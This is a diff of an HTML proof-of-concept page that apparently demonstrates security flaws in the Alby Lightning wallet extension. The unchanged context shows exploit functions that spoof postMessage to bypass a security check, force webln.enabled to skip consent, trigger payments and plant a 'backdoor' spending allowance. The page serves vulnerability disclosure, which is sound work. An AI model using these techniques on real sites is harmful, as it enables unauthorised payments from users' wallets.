@@ -4,6 +4,17 @@
     <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
     <link rel="icon" href="/favicon.png">
     <title>Alby security PoC</title>
+    <style>
+      button {
+        width: 93%;
+        display: inline;
+        margin-right: 1.3rem;
+      }
+
+      .display {
+        display: initial !important;
+      }
+    </style>
     <script>
       async function getInvoice(amount) {
         const zbdData = await fetch(`https://getalby.com/lnurlp/aaron/callback?amount=${amount}&comment=Alby%20Vulnerability%20PoC`);
@@ -104,14 +115,16 @@
         </hgroup>
         <div class="button-group">
           <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
-          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;">
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code1').classList.toggle('display');return false;">i</a>
+          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code1">
 async function sendUsingWebLnExec() {
   await window.webln.execute("sendPayment", {
     paymentRequest: await getInvoice(1000),
   });
 }</pre>
           <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
-          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;">
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code2').classList.toggle('display');return false;">i</a>
+          <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code2">
 async function sendUsingPostMsg170() {
   window.postMessage(
     {
@@ -136,7 +149,8 @@ async function sendUsingPostMsg170() {
         </hgroup>
         <div class="button-group">
           <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
-  <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;">
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code3').classList.toggle('display');return false;">i</a>
+  <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code3">
 async function sendUsingPostMsg180() {
   window.postMessage(
     {
@@ -152,13 +166,15 @@ async function sendUsingPostMsg180() {
   );
 }</pre>
           <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
-<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;">
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code4').classList.toggle('display');return false;">i</a>
+<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code4">
 async function bypassEnableSend() {
   window.webln.enabled = true;
   await window.webln.sendPayment(await getInvoice(1000));
 }</pre>
           <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
-<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;">
+          <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code5').classList.toggle('display');return false;">i</a>
+<pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:hidden;" id="code5">
 async function setupBackdoor() {
   // Add if non-existent
   window.postMessage(
